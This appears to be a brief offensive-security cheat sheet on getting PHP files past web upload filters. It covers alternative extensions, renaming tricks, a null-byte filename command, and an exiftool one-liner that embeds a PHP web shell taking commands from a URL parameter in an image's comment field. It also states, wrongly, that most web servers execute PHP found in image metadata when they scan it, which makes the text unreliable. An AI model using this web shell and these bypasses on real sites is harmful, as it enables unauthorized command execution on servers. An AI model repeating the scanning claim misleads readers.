---
title: "Bypassing Upload Restrictions"
tags: [
]
---

PHP has multiple alternative extensions:
>phtml, .php, .php3, .php4, .php5, and .inc

It might be possible to upload and execute a `.php` file simply by renaming it `file.php.jpg` or `file.PHp`.

Add a null byte at the end
```bash
cp payload.php payload.php%00.jpg
```

Put a payload inside a jpg file, into the exgif data.  Most web servers scan the file, and when it scans the file it executes the php data in the exgif file.   

Use exiftool
```bash
exiftool -Comment="<?php system($_GET['cmd']); ?>" pic.jpg
```
